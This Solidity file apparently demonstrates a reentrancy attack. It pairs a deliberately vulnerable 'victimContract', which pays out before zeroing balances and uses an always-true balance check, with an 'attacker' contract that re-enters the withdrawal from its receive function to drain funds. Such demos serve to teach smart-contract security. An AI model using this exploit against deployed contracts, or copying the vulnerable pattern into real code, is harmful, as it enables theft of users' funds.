// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract victimContract {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawEth() public {
        require(balances[msg.sender] >= 0, "Not enough balance");
        (bool success,) = msg.sender.call{value: balances[msg.sender]}("");
        require(success, "Transfer failed");

        balances[msg.sender] = 0;
    }
}

contract attacker {
    address public victimAddress;

    function setVictimAddress(address _victimAddress) public {
        victimAddress = _victimAddress;
    }

    function deposit(address victim) public payable {
        victimContract(victim).deposit{value: msg.value}();
    }

    receive() external payable {
        if (victimAddress.balance >= 10 ether) {
            victimContract(msg.sender).withdrawEth();
        }
    }

    function withdraw(address victim) public {
        victimContract(victim).withdrawEth();
    }
}
